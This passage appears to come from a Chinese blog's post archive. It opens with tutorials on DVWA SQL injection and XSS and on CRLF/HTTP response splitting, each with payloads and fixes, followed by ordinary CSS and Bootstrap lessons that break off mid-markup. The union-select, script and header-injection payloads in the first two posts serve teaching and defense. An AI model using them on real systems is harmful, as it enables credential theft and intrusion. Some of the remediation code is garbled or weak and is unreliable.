    <content type="text"><![CDATA[0x00 前言“安全是一个整体，保证安全不在于强大的地方有多强大 而在于真正薄弱的地方在哪里”–剑心 漏洞形成的原因就是接受了不安全的变量输入，又没得到有效的过滤，最后进入一些对敏感的函数就会对安全造成威胁。比如出现在mysql_query()函数可能就会造成SQL注入漏洞，出现在eval()以及preg_replace()中可能导致代码的执行。 主要介绍DVWA上的漏洞及修复方案：DVWA下载地址 0x01 SQL注入漏洞low的级别下$id变量没有经过任何的过滤，直接传入了sql语句，造成字符型注入 POC: ‘ union select user,password from users# SQL语句为： SELECT first_name, last_name FROM users WHERE user_id = ‘’ union select user,password from users# medium级别下虽然$id经过了mysql_real_escape_string转义了’，可是因为后面的SQL语句$id没有单引号保护，会被系统认为是数值型，导致数值型注入 POC: 1 union select user,password from users SQL语句为： SELECT first_name, last_name FROM users WHERE user_id = 1 union select user,password from users SQL注入修补方法 字符型注入漏洞修补方法： PHP5.3之前版本在php.ini中设置magic_quotes_gpc=On; magic_quotes_quotes_gpc会对传入的$_POST,$_GET,$_SERVER里的 ‘,”,\进行转义。 但是PHP5.4之后，magic_quotes_quotes_gpc就被废除了。 还要使用mysql_real_escape_string()或addslashes()对传入参数进行过滤，或者使用str_replace()对一些关键词进行替换。 但是addslashes()和mysql_real_escape_string()在数据库字符集设为GBK时是可能被绕过的。 如果数据库字符集是GBK的情况下，可以把 $mysqli-&gt;query(&apos;SET NAMES gbk&apos;); 修改为： $mysqli-&gt;set_charset(&apos;gbk&apos;); 数值型注入： 数值型注入比较好修补，只需要判断传入的变量是否为数值型就可以了(或者强行改成数值型mysql_numrows) 0x02 XSS漏洞黑客往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到黑客的特殊目的，比如窃取用户cookies.或者进行其他操作。 low级别下$message,$name两个变量从$_POST传入,只是经过一些特殊字符的转换。并没有对尖括号进行转义,所以还是造成了XSS的产生。 POC: &lt;script&gt;alert(1)&lt;script&gt; medium级别下，虽然对$message进行了尖括号转义，而且对&lt;script&gt;进行了替换，但是$name没有进行转义，而且跨站脚本可以用多种标签，如&lt;img /&gt;,等…。Name的&lt;input /&gt;限制了maxlength=‘10’的长度，但是我们的防御对象是精通技术的黑客。这种html下的长度限制是可以直接通过浏览器修改..然后通过大小写成功绕过str_replace()，插入XSS. POC: &lt;SCript&gt;alert(1)&lt;/SCript&gt; XSS修复方法 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码 在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码 使用富文本时，使用XSS规则引擎进行编码过滤 其实使用htmlspecialchars()在输出时对输出内容进行转义。在输出时进行转义比输入时进行转义效果更好，因为可以确保数据在入库时是完整的….不然丢失数据。 0x03 任意命令执行漏洞参考文章：命令执行漏洞总结 0x04 暴力破解加个google验证码，保证没有程序能识别出来… 0x05 文件包含漏洞参考文章：文件包含漏洞总结]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
        <tag>编程</tag>
        <tag>PHP</tag>
        <tag>命令执行</tag>
        <tag>SQL注入</tag>
        <tag>安全开发</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CRLF漏洞]]></title>
    <url>%2F2016%2F08%2F31%2FCRLF-injection%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 简介在文本处理中, CR, LF, CR/LF是不同操作系统上使用的换行符.Dos和windows采用回车+换行CR/LF表示下一行,而UNIX/Linux采用换行符LF表示下一行，苹果机(MAC OS系统)则采用回车符CR表示下一行.CR用符号’r’表示, 十进制ASCII代码是13, 十六进制代码为0x0D; LF使用’n’符号表示, ASCII代码是10, 十六制为0x0A.所以Windows平台上换行在文本文件中是使用 0d 0a 两个字节表示, 而UNIX和苹果平台上换行则是使用0a或0d一个字节表示. 0x01 原理我们都知道，HTTP协议是依靠两个CRLF，即\r\n来分割HTTP头部及响应体。基于这个认知，可以推出，HRS问题是由于服务端程序没有过滤掉头部中的特殊字符%0D%0A，直接输出到了返回的数据中，导致错误的解析。而在日常开发中，最常见的莫过于有以下的两种功能（1）URL跳转（2）Cookie的设置中出现。 一旦我们能够控制http头，通过注入一些CRLF这样就可以控制header和body的分割线，这样我们就可以向body或是header中注入些东西了。所以CRLF Injection又叫HTTP Response Splitting，简称HRS。 0x02 危害如果目标网页存在响应头部CRLF注入，在HTTP响应头注入回车换行符，就可以注入头部：X-XSS-Protection: 0 HTTP header的定义就是基于这样的&quot;Key: Value&quot;的结构，用CRLF命令表示一行的结尾。 &quot;Location:&quot;头用来表示重定向的URL地址， &quot;Set-Cookie:&quot;头用来设置cookies。 如果用户的输入经过验证，其中存在CRLF的字符就可以被用来达到欺骗的目的。 0x03 实例测试代码：index.php &lt;?php /* *@博客：http://byd.dropsec.xyz/ *@Author：w2n1ck */ echo &apos;&lt;pre&gt;&apos;; print_r(file(&quot;http://www.site1.com/api?test=$test&quot;/images/test.png)); echo &apos;&lt;/pre&gt;&apos;; ?&gt; 如果攻击者这样发送： index.php?test=test%20HTTP /1.0%0D%0AHost%3A%20www.site2.com%0D%0AUser-Agent%3A%20joy_nick/0.0%0D%0AReferer%3A%20http%3A%2F%2Fwww.test.org%2F%0D%0ACookie%3A%20user%3Djoy_nick%0D%0A%0D%0AHTTP/1.0%0D%0AHost%3A%20http%3A%2F%2Fwww.SITE1.com%0D%0AUser-Agent%3A%20PHP/4.1.2 (必须在一行上) 这个 HTTP 请求将被发送给 www.site1.com: GET /api?test=test HTTP/1.0 Host: www.site2.com User-Agent: joy_nick/0.0 Referer: http://www.test.org/ Cookie: user=joy_nick HTTP/1.0 Host: www.site1.st User-Agent: PHP/4.1.2 你可以看到，真实的PHP头信息被正确发送，但被服务器忽略了，因为在它们指向的报头结束之前我们发送两个CRLF。 利用此缺陷，攻击者能够任意添加用户代理（user-agent），referers 和 cookies。如果站点1和站点2是同一台服务器上的虚拟主机，即使index.php有限制，攻击者也能绕过其限制非法访问站点2。 还有一个xss的能够轻松绕过filter的XSS，如果我们输入： http://www.xxx.com%0d%0a%0d%0a%3Csvg%2fonload%3dprompt%281%29%3E HTTP/1.1 200 ok Date: XXX Content-Type: text/html Content-Length: 154 Connection: close &lt;svg/onload=prompt(1)&gt; 从而形成XSS漏洞 0x04 防御 您需要限制用户输入CR（0x13）和LF（为0x10）或正确编码的输出，以防止自定义HTTP标头注射。 通过在PHP脚本中嵌入如下指令，确保所有这种类型的URL变量在使用时已被清空： $var = preg_replace(’///s+/’, ’, $var); 如果你的脚本不需要访问URLs，建议在php.ini中关闭allow_url_fopen]]></content>
      <tags>
        <tag>CRLF</tag>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端开发基础知识]]></title>
    <url>%2F2016%2F08%2F29%2F%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[CSS盒子模型网页设计中常听的属性名：内容(content)、填充(padding)、边框(border)、边界(margin)， CSS盒子模式都具备这些属性。 元素实际占用尺寸 = width(height) + padding + border + margin 选择器CSS1 定义的选择器 元素选择器：E ID选择器：#id 类选择器：E.class 包含选择器：E F 伪类选择器：E:link、E:visited、E:active、E:hover、E:focus 伪元素：E:first-link、E:first-letter CSS2.1 增加的选择器 通配选择器：* (星号) 伪类选择器：E:lang(fr) 子包含选择器：E &gt; F 相邻兄弟选择器：E + F 伪元素：E:before、E:after 属性选择器：E[foo]、E[foo=”bar”]、E[foo~=”bar”]、E[foo|=”bar”] 优先级 ※同级后来居上 例如： HTML代码： &lt;ul class=&quot;list&quot;&gt; &lt;li&gt;one&lt;/li&gt; &lt;li&gt;two&lt;/li&gt; &lt;li&gt;three&lt;/li&gt; &lt;/ul&gt; CSS代码： ul li{color:#000;} 1 + 1 =2 .list li{color:#f00;} 10 + 1 =11 .list li 的优先级更高，所以浏览器会显示 .list li 设置的样式 其实说白了，就是后面的会把前面的覆盖掉，内敛的会把link的覆盖掉，然后再整合。 布局浮动 (float) none：不浮动（默认值） left：左浮动 right：右浮动 解释： 浮动什么意思呢，比如，默认的，我们知道，div是占满一行的，现在我们想把两个div显示在一行上，那怎么办呢 &lt;div style=&quot;width:100px;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt; 这样我们就设置了两个div，一个宽度100px,一个宽150px,可预览一下，我们的div仍在两行上，那么怎么把它改到一行上呢，这儿就需要float，设置第一个div的float为left &lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt; 再预览，就可以看到，它们到一行上了。 clear是什么意思呢，clear是清除的意思，它有三个值，left,right,both 很好理解，如果设置了clear:left，它就不怕它的左边有float，同理clear:right,clear:both，是左右都不让有float 举个例子，还是上面的 我们设置第二个div的clear:left,也就是不让它左边有float &lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px;clear:left;&quot;&gt;2222&lt;/div&gt; 我们预览一下，就可以看到，尽管第一个div已经float:left了，这两个div仍然在两行上，就是由于第二个div不让它左边有float 因为css的定义是后面的可以覆盖前面的，明白了吧 清浮动-clear-bothHTML代码： &lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt; CSS代码： .layout{} .left{float:left} .right{float:right} .clear{clear:both} 清浮动-overflow:hiddenHTML代码： &lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; &lt;/div&gt; CSS代码： .layout{overflow:hidden;zoom:1;} .left{float:left} .right{float:right} 定位 (position) static-没有定位（默认值） relative-相对定位 absolute-绝对定位 fixed-固定定位 层级 层级 (z-index) - 后来居上 层级 (z-index) - 定位元素高于非定位元素 层级 (z-index) - 同为定位元素则比较 z-index 隐藏与显示 隐藏元素：display:none;visibility:hidden; 显示元素：display:block;visibility:visible; ※ “display” 在 块级元素&amp;行内元素 中再详细介绍 CSS Resethtml,body,div,ul,ol,li,dl,dt,dd,h1,h2,h3,h4,h5,h6,p,table,th,td,fieldset, form,input,button,textarea,hr,blockquote,pre{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{font-size:100%; font-weight:bold;line-height:1em;} ul,ol,dl{list-style-type:none;} fieldset,img{border:none;} table{border-collapse:collapse;table-layout:fixed;empty-cells:show;} address,caption,cite,code,dfn,th{font-style:normal;font-weight:normal;} ins{text-decoration:underline;} del{text-decoration:line-through;} q:before,q:after{content:&quot;&quot;;} 注意事项： 不要使用 *{margin:0;padding:0;} 最2B的 Reset： div{float:left;} CSS 优化属性简写-外边距margin:10px 15px 20px 25px; 下 上 右 左 顺时针方向 margin:10px; 上下左右统一设置 margin:10px 15px; 上下 左右 属性简写-内边距padding:10px 15px 20px 25px; 下 上 右 左 简写方式与 margin 相同 属性简写-背景background:#ff0000 url(bg.jpg) no-repeat fixed top center; 颜色 图像 平铺方式 滚动方式 图像开始位置 可以省略部分值 background:#f00; background:url(bg.jpg) no-repeat; 属性简写-边框border:1px solid #ff0000; 宽度 样式 颜色 可以省略部分值 border:solid #f00; border:1px solid; 属性简写-字体font:italic bold 15px/20px &quot;微软雅黑&quot; 斜体 粗体 字号/行高 字体名称 字号与字体名称是必须的，其他值可省略 font:15px “微软雅黑”; 注意事项： 简写中省略不写的属性，将使用默认值，而不是继承。 属性继承文本相关的样式会继承 列表相关的样式会继承 颜色属性会继承 选择器优化从右到左的解析顺序 body ul li a {color:#f00;} 4 3 2 1 选择器的效率 ※在一些 JavaScript 库中的选择器，也适用于该效率。（例如：jQuery） 属性继承，减少选择器 .box { padding:10px; } .box p { color:#333; } 简化为： .box { padding:10px ; color:#333; } 书写顺序显示属性 自身属性 文本属性 display top color visibility left font overflow width line-height position height text-align float margin text-decoration clear padding text-indent border text-transform outline vertical-align background white-space content 标签&amp;语义 块元素&amp;行内元素块元素 (block) div p h1~h6 ul ol li dl dt dd table form … 行内元素 (inline) span a img em strong select input textarea … 行内元素无法设置一些CSS属性，例如： width, height, margin-top, margin-bottom, padding-top padding-bottom, text-index … ※可以使用 display 来改变 display 常用属性 完整属性查阅：http://www.w3school.com.cn/css/pr_class_display.asp inline 设置为行内元素 block 设置为块元素 inline-block 设置为行内块元素* none 元素不会被显示 嵌套规则 块元素内能包含所有行内元素 行内元素不能包含块元素 以下块元素中不能包含块元素 h1~h6, p, dt, address HTML5 简单应用DocType &lt;!DOCTYPE HTML&gt; 字符集 &lt;meta charset=&quot;utf-8&quot;&gt; 外链 css 文件 &lt;link rel=&quot;stylesheet&quot; href=“filename.css&quot;&gt; 外链 javascript 文件 &lt;script src=“filename.js&quot;&gt;&lt;/script&gt;]]></content>
      <tags>
        <tag>前端</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BootStrap学习笔记]]></title>
    <url>%2F2016%2F08%2F29%2FBootStrap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[BootStrap是什么BootStrap是基于HTML、CSS和JavaScript的框架，使你只需要写简单的代码就可以很快的搭建一个还不错的前端界面，它是后端程序员的福音，使他们只需要专注业务逻辑，而无须浪费太多的精力在界面设计上。 全响应 它可以开发全响应式网页——不论你使用手机、平板电脑、普通个人电脑浏览网站内容，所有的元素都可以很优雅的呈现，减轻了因为兼容性而带来的工作量。 版本 它的最新版本是4.0，国内目前用的较多的是3.x,本教程也基于BootStrap3.x版本。 二次开发 你可以使用默认的BootStrap样式、组件和插件，你也可以对其进行二次开发，甚至你还可以基于BootStrap环境使用自己开发的组件。 你可以登陆http://v3.bootcss.com点击页面中的下载BootStrap按钮下载完整版。 1.首先把它的文件按照类别放在项目的文件夹中 你可以把CSS文件——bootstrap.min.css放在类似stylesheets这样专门放CSS的文件夹。把js文件——bootstrap.min.js放在类似Scripts文件夹中。当然，最终如何部署可以按照你的个人喜好。 2.在页面中使用BootStrap 将BootStrap的文件bootstrap.min.css、bootstrap.min.js引入当前页面中，由于BootStrap是基于Jquery的，所以在引入它的js文件之前，一定要先引入Jquery.js。注意：这里考虑到文件大小，我们引入了min版的文件，当然，你也可以引入完整版的文件。 示例代码如下： &lt;!-- Bootstrap 核心 CSS 文件 --&gt;&lt;/p&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/stylesheets/bootstrap.min.css&quot;&gt; &lt;!-- jQuery文件 --&gt; &lt;script src=&quot;/scripts/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Bootstrap 核心 JavaScript 文件 --&gt; &lt;p&gt;&lt;script src=&quot;/scripts/bootstrap.min.js&quot;&gt;&lt;/script&gt; BootStrap栅格布局BootStrap栅格布局是灵活使用BootStrap的基础。BootStrap将屏幕分为12等分，在具体的DIV中，可以通过设置DIV的所占等分的数字确定其在屏幕中占有的宽度。如： &lt;div class=&quot;row“&gt;&lt;!--表示另起一行--&gt; &lt;div class=&quot;col-md-8&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;col-md-4&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt; &lt;/div&gt; 在第一个DIV中class=&quot;col-md-8&quot;,第二个DIV中class=&quot;col-md-4&quot;, 其中‘8’和‘4’就是其DIV所占屏幕宽度的数值，加在一起等于‘12’。也就是第一个DIV占整个屏幕宽度的‘8/12’,第二个DIV占‘4/12’。 注：在上述代码中为了突显区块，我们设置了DIV的边框宽度为1像素黑色实线，高度设为100像素。 布局屏幕分类BootStrap是一种全响应的技术，那么针对不同的屏幕，它是怎么提供支持的呢？ 别担心，针对不同的显示屏幕尺寸，BootStrap提供了不同的栅格布局的属性： col-xs-* 超小屏幕 手机 (&lt;768px) col-sm-* 小屏幕 平板 (≥768px) col-md-* 中等屏幕 桌面显示器 (≥992px) col-lg-* 大屏幕 大桌面显示器 (≥1200px) 多个布局属性如果想让一个DIV在不同的屏幕中占有不同的屏宽该怎么做呢？ BootStrap允许我们在一个DIV中写多个类别的布局属性，从而让该DIV在不同的屏幕中呈现不同的屏宽。如： &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-8 col-xs-6 col-lg-4&quot;&gt;&lt;/div&gt; &lt;/div&gt; 该DIV在中等屏幕中占有‘8/12’，在手机中占有‘6/12’，在大屏幕中占有屏幕比例的‘4/12’。 网站首页整体设计思路整体架构一般而言首页设计几乎等同与整个网站设计，那么首页中到底应该放些什么内容才好呢？这要看网站有哪些主要的元素。本教程里要设计的网站首页是一个多用户博客类的网站首页，在该网站中用户可以发表博客，也可以推荐图书给其他用户。所以，首页中的板块包括这些应该是恰当的： 整站导航条 文章（博客）展示板块 图书展示板块 用户（会员）展示板块 脚注——footer部分 其中导航条和脚注是整个网站中都要用到的，具体实现时可以放在布局模板中。 板块划分根据上面的整体架构，我们将首页的板块分为以下几个： 1.文章板块——将最新、最热的文章以标签页（tab）切换方式放在该模块中，为了页面美观，将有图片的文章的第一章图片放在轮换图片（caoursel）插件中,最右侧放置热门文章分类。 2.图书板块——按照图书的分类将图书放在首页中，点击不同的分类切换到不同的选项卡。图书展示使用自己开发的Jquery Tab插件，并将其整合到BootStrap环境中。最右侧同样是图书的分类。 3.用户板块——将新加入的用户和对社区贡献最多的用户放在首页中 要用到的BootStrap元素那么，我么要用到哪些BootStrap元素才能很好的展示我们的板块内容呢？ 1.导航条 这里要用到固定在网页头部的导航条（navbar-fixed-top）,并在其中整合用户登录模块，代码如下 &lt;div class=&quot;navbar navbar-inverse navbar-fixed-top&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a class=&quot;navbar-brand active&quot; href=&quot;首页URL&quot;&gt;顶求网&lt;/a&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;图书页面URL&quot;&gt;图书&lt;/a&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;文章页面URL&quot;&gt;文章&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;btn-group&quot; style=&quot;margin-top:10px; float:right;&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-default dropdown-toggle&quot; data-toggle=&quot;dropdown&quot;&gt; 会员登陆 &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot;&gt; &lt;LI&gt;&lt;a href=&quot;会员登陆页面URL&quot; target=&quot;_top&quot;&gt;会员登陆&lt;/a&gt;&lt;/LI&gt; &lt;LI&gt;&lt;a href=&quot;会员注册页面URL&quot; target=&quot;_top&quot;&gt;会员注册&lt;/a&gt;&lt;/LI&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; 2.文章板块需要用到的BootStrap元素 1.轮换图片插件（caoursel)——解决了展示图片时图片变形的问题。 2.标签页插件（tabs）——对插件的样式进行了美化，并增加了自动切换功能。 3.信息按钮（btn-info）组件——用它列出文章分类信息。 3.图书板块需要用到的元素 1.自己开发的Jquery Tab插件 2.缩略图(thumbnail)组件 3.分类标签(仿豆瓣) 4.用户板块用到的BootStrap元素 1.BootStrap原生tab 2.圆形图片（image_circle） 文章板块的设计与实现布局怎样的布局才能让网站中的文章以较好的形式呈现在首页上呢？既要反应更新，又要有精华。由于文章板块在首页上处于最上面的部分，所以，考虑使用轮换图片插件来吸引眼球，并且还需要展示最新的文章和热门文章以及文章分类。划分如下： 左部——轮换图片(carousel)和文章列表(tabs)部分，各占一半。 右部——文章分类部分。 左边占据（8/12），右边占据（4/12） 布局代码如下： &lt;!--板块的左部，使用panel，占据8/12--&gt; &lt;div class=&quot;panel panel-default col-md-8&quot;&gt; &lt;!--轮换图片（carousel）插件,占左部的一半--&gt; &lt;div class=&quot;col-md-6&quot;&gt; &lt;div class=&quot;carousel slide&quot; &gt; &lt;/div&gt; &lt;/div&gt; &lt;!--文章tabs，占左部的一半--&gt; &lt;div class=&quot;noborder col-md-6&quot;&gt; &lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--板块的右部，使用普通的DIV，占据4/12--&gt; &lt;div class=&quot;col-md-4&quot;&gt; &lt;/div&gt; 使用Carousel（轮换图片）插件首页中使用Carousel插件往往能达到吸睛的目的，是用来展示图文内容的最佳手段。在页面中使用carsouel插件很容易，可以分为以下几个步骤： 1.在DIV的class属性中加入carousel 加入carousel后，该DIV就是一个轮换图片插件了 &lt;div class=&quot;carousel slide&quot; data-ride=&quot;carousel&quot;&gt; &lt;/div&gt; 2.设置内容区（carsouel-inner） 在上述DIV中加入新的DIV作为其主体内容，其class=&quot;carsouel-inner&quot;。 &lt;div class=&quot;carousel-inner&quot; role=&quot;listbox&quot;&gt; &lt;/div&gt; 3.在内容区中放入要展示的元素（item） &lt;div class=&quot;item active&quot;&gt; &lt;a href=&quot;包含图片文章路径&quot;&gt; &lt;img src=&quot;图片路径&quot; alt=&quot;图片信息&quot;/&gt;&lt;/a&gt; &lt;div class=&quot;carousel-caption&quot;&gt; &lt;h4 class=&quot;alpha&quot;&gt; &lt;a style=&quot;color:white;&quot; href=&quot;包含图片文章路径&quot;&gt;图片标题&lt;/a&gt; &lt;/h4&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--其他item--&gt; 可以看到在元素区中包含文章展示信息——文内图片+标题+指向文章的链接。 4.按钮区（carousel-control） 最后放入，“上一个”，“下一个”按钮（左右箭头），用于用户自主切换。 &lt;a class=&quot;left carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;prev&quot;&gt; &lt;span class=&quot;glyphicon glyphicon-chevron-left&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;sr-only&quot;&gt;Previous&lt;/span&gt; &lt;/a&gt; &lt;a class=&quot;right carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;next&quot;&gt; &lt;span class=&quot;glyphicon glyphicon-chevron-right&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;sr-only&quot;&gt;Next&lt;/span&gt; 图片变形 运行右侧的代码中可以看出,当不同长宽比的图片试图占满元素(item)区时，图片发生了变形。 解决展示时图片变形的问题运行上节的代码我们发现插件中的图片发生了变形，分析其原因为：轮换插件中的图片使用的文章中的第一张图片，图片的大小不一，而轮播插件的大小基本是固定的，所以展示的时候图片出现了变形。下面看看怎么解决这个问题： 1.引入Jqthumb.js 在BootStrap中我们找不到解决办法，所以我们需要借助其它工具。Jqthumb插件是专门用来为图片生成缩略图的，它可以从图片中的任何坐标点开始取指定大小的图片区域作为图片的缩略图。你可以点击 https://github.com/pakcheong/jqthumb 来下载它，并将其应用到项目中(假设在当前项目中，jqthumb.js放置在scripts文件夹中): &lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt; 2.在图片加载(onload)的时候调用DrawImage()函数来生成缩略图 DrawImage()函数正是基于jqthumb.js库的，注意该函数一定要写在轮换插件前，因为我们必须在图片加载前生成缩略图。DrawImage()函数代码如下： &lt;!--导入插件--&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt; &lt;script&gt; function DrawImage(hotimg) { $(hotimg).jqthumb({ classname : &apos;jqthumb&apos;, width : &apos;100%&apos;,//宽度 height : &apos;300px&apos;,//高度 position : { y: &apos;50%&apos;, x: &apos;50%&apos;},//从图片的中间开始产生缩略图 zoom : &apos;1&apos;,//缩放比例 method : &apos;auto&apos;,//提交方法，用于不同的浏览器环境，默认为‘auto’ }); } &lt;/script&gt; 在上述代码中，我们使用了jqthumb，并且传入了相关初始化参数。调用了该函数后，在图片加载的时候，就会按照上述参数产生图片的缩略图，从而解决图片变形问题。由于缩略图是从原始图片的正中间开始往两边取得，所以该缩略图包含了图片的主要内容。 针对BootStrap tab的二次开发为什么要进行二次开发 在文章列表部分，我们使用了BootStrap的Tab插件。BootStrap中的tab控件是在一小块区域展示大量信息的首选。但是，它的样式比较单一。而在展示文章列表模块时，我希望它可以更美观，而且选项卡可以自动切换。 使用Tab插件 在页面中使用BootStrap的Tab插件的方法如下： 1.在DIV加入role=”tabpanel” 加入该属性值后，该DIV则变成了tab插件。 &lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt; &lt;/div&gt; 2.使用列表制作切换标签 列表项即为切换标签项。 &lt;ul class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot; style=&quot;margin-top:0px;&quot; id=&quot;docTabs&quot;&gt; &lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;&lt;a href=&quot;#Section_new&quot; aria-controls=&quot;home&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot;&gt; 最新&lt;/a&gt;&lt;/li&gt; &lt;!--其余标签卡……--&gt; &lt;/ul&gt; 代码中可以看出，在超级链接元素（a）中有指向该标签页内容的链接地址，如“最新”标签中，href=&quot;#Section_new&quot;,而这个地址一定要跟后面的标签内容页（tab-pane）的ID一一对应。 3.标签内容页区域（tab-content） 所有的标签内容页均放在这个区域。 &lt;div class=&quot;tab-content&quot;&gt; &lt;!--最新--&gt; &lt;!--7天热门--&gt; &lt;!--30天热门--&gt; &lt;/div&gt; 4.单个标签页（tab-pane） tab插件的最小元素，具体的标签内容页。 &lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade in active&quot; id=&quot;Section_new&quot;&gt; &lt;P&gt; tab中的内容 &lt;/P&gt; &lt;/div&gt; &lt;!--其余标签页……--&gt; tab样式美化下面我们来美化一下tab的样式吧，通过CSS代码来设置tab插件的样式，这些样式会覆盖掉bootstrap中的原有样式达到美化tab的效果，主要包括: 标签的形状和背景色 当前(被选中)标签的样式和背景色 标签内容页样式 与小屏幕兼容 //标签样式 .tab .nav-tabs { ……//详见右侧代码 } //标签链接样式 .tab .nav-tabs li a { background: transparent; ……//详见右侧代码 } //当前选中标签样式 .tab .nav-tabs li.active a, .tab .nav-tabs li.active a i { ……//详见右侧代码 } //当前选中标签之后插入的样式 .tab .nav-tabs li.active a:after { ……//详见右侧代码 } //标签内容页样式 .tab .tab-content { ……//详见右侧CSS代码 } //在小屏幕中的样式 @media only screen and (max-width: 480px) { ……//详见右侧代码 } tabs自动切换功能的实现文章列表中列出的最新、7天热门、30天热门这三个选项卡每隔5秒钟自动切换，当鼠标悬停到某选项卡的时候，则暂停轮换，移开后，继续切换。代码设计思路如下： 设置一个定时器timer()，每隔5秒钟对标签页进行切换一次。 在网页加载完以后就运行该定时器。 当用户鼠标悬停到某个标签页上时，清除该（clearInterval）定时器。 鼠标移开后，继续使用定时器。 //tabs自动轮换 function timer(i) { interval=setInterval(function() { $(&quot;#docTabs li:eq(&quot;+i+&quot;) a&quot;).tab(&apos;show&apos;); i++; if(i&gt;2) i=0; } ,5000); return interval; } $(function(){ var i=0; interval=timer(i); //当鼠标悬停在列表区域时暂停轮换 $(“.tab-pane”).mouseover(function(){ clearInterval(interval); }); //鼠标移开时继续轮换 $(“.tab-pane”).mouseout(function(){ timer(i); }); }); 分类展示实现过程 文章分类展示部分采用了BootStrap原生的信息按钮（btn-info）,当鼠标悬停时变色，点击则转向相应的二级页面，代码如下： &lt;div class=&quot;col-md-4&quot; style=&quot;float:right;&quot;&gt; &lt;div&gt; &lt;H5&gt;分 类&lt;/H5&gt; &lt;div style=&quot;font-size:14px;&quot; id=&quot;blogclas&quot;&gt; &lt;a style=&quot;margin-left:5px; margin-bottom:5px;&quot; class=&quot;btn btn-info col-md-3&quot; href=&quot;二级页面地址&quot; role=&quot;button&quot;&gt;分类名&lt;/a&gt; &lt;!--其他分类信息--&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; 代码分析 由代码可知，分类区域占有的宽度为（4/12）col-md-4，而其中的单个分类又占有其中的（3/12） col-md-3，也就是每4个分类占一行（实际上由于分类之间要有间隔，只能是3个分类占一行）。 图书板块的设计与实现布局图书板块的布局既要考虑到分类展示图书信息，还需要考虑与前面文章板块的对应，所以，图书板块也分为左右两部分，左边同样使用col-md-8,右边使用col-md-4来划分宽度。当然，如果在其它屏幕有不同的布局需求，你也可以添加上其他的属性值，如col-xs-6（在手机屏幕中占6/12）等。布局代码如下： &lt;div class=&quot;col-md-8&quot; id=&quot;indexbooks&quot;&gt; 首页图书展示区…… &lt;/div&gt; &lt;div class=&quot;col-md-4&quot;&gt; 图书分类展示区…… &lt;/div&gt; 开发Jquery tab为什么要自己写tab 为了更好的在首页图文并茂的展示图书信息以及按类别展示尽可能多的图书，我决定使用Jquery开发自己的tab。下面来看看我的实现过程。 HTML部分 1.标签项 标签仍然使用列表来完成，列表项即为标签项。 &lt;ul id=&quot;booksfilter&quot; style=&quot;float:right;font-size:14px;&quot;&gt; &lt;li&gt;&lt;a class=&quot;cur&quot; href=&quot;javascript:void(0);&quot;&gt;入门&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;a 